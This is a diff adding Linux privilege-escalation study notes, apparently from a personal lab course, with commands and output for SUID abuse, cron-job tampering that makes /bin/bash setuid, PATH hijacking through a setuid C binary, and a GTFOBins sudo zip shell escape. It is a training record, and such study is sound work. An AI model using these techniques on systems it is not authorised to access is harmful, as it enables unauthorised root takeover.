@@ -114,3 +114,204 @@ cd directorio
 cd: permission denied: directorio
 
 ```
+### SUID
+```bash
+which find
+which find | xargs ls -l
+# ans
+-rwxr-xr-x 1 root root 233040 Aug 10  2024 /usr/bin/find
+
+# SETTING SUID PERMS
+chmod 4755 /usr/bin/find
+
+# gtfobins.org : search SUID vuln using find (SUID)
+find . -exec /bin/sh -p \; -quit
+
+# Execute bin like owner temporaly
+
+
+
+```
+### 08 Abuso privilegios
+```
+uname -a
+lsb_release -a
+
+cd /
+find \-perm -4000 2>/dev/null
+find \-writable 2>/dev/null
+
+openssl passwd # to create pass
+
+```
+### 09 Cron
+```bash
+sudo su
+cd /etc/cron.d
+
+```
+![alt text](image.png)
+
+```bash
+nvim tarea
+
+* * * * * root /home/edibauer/Desktop/file.sh
+
+nvim file.sh
+# file.sh
+#!/bin/bash
+
+sleep 9
+rm -r /tmp/*
+
+chmod +x file.sh
+chmod o+x file.sh
+
+
+```
+### 10 Deteccion tareas cron
+```bash
+ps -eo command
+
+# procmon.sh
+#!/bin/bash
+
+old_process=$(ps -eo command)
+
+while true; do
+	new_process=$(ps -eo command)
+	diff <(echo "${old_process}") <(echo "${new_process}") | grep "[\>\<]" | grep -v "kworker"
+	old_process=${new_process}
+done
+
+# ans
+> /usr/sbin/CRON -f
+> /bin/sh -c /home/edibauer/Desktop/file.sh
+> /bin/bash /home/edibauer/Desktop/file.sh
+> sleep 9
+
+# CHANGING file.sh
+#!/bin/bash
+chmod 4755 /bin/bash
+
+watch -n 1 /bin/bash
+# ans
+-rwsr-xr-x 1 root root 1380656 Sep  3  2025 /bin/bash
+
+bash -p
+whoami
+# and
+root
+
+
+```
+### 11 PathHijacking
+```bash
+sudo su
+
+# backup.c file
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+void main() {
+	setuid(0);
+	printf("\n\n [+] Listando procesos...(/usr/bin/ps):\n\n");
+	system("/usr/bin/ps");
+	printf("\n\n [+] Listando procesos...(ps):\n\n");
+	system("ps");
+}
+
+gcc backup.c -o back_up
+chmod 4755 back_up
+
+su pepito
+./back_up
+
+
+
+```
+### 12 PathHijacking
+```bash
+echo $PATH
+# ans
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+
+cd /tmp
+nvim whoami
+
+# whoami file
+ps
+
+# in /tmp dir
+export PATH=.:$PATH
+echo $PATH
+# ans
+.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+
+whoami
+# ans
+    PID TTY          TIME CMD
+1679320 pts/2    00:00:00 bash
+1682609 pts/2    00:00:00 bash
+1682610 pts/2    00:00:00 ps
+
+exit # to roolback PATH variable
+su pepito
+
+cd /tmp
+touch ps
+chmod +x ps
+
+# ps file
+bash -p
+
+export PATH=/tmp:$PATH
+cd /home/edibauer/Desktop
+
+./back_up
+
+```
+### 13 Capabilitites
+```bash
+cd /
+
+
+```
+### 68 Abuso Sudoers
+```bash
+sudo su
+
+mkdir pepe
+useradd pepe -d /home/pepe -s /bin/bash
+passwd pepe
+
+# ADD USER INTO SUDOERS FILE
+nano /etc/sudoers # like root
+pepe ALL=(root) NOPASSWD: /usr/bin/zip
+
+su pepe
+sudo -l
+# ans
+Matching Defaults entries for pepe on kali:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User pepe may run the following commands on kali:
+    (root) NOPASSWD: /usr/bin/zip
+bash-5.3$ 
+
+# GTFOBins
+sudo zip /tmp/test.zip /etc/hosts -T -TT 'sh -c /bin/bash'
+
+
+
+```
+### 69 Abuso SUID
+```bash
+cd /
+find \-perm -4000 2>/dev/null
+
+
+```
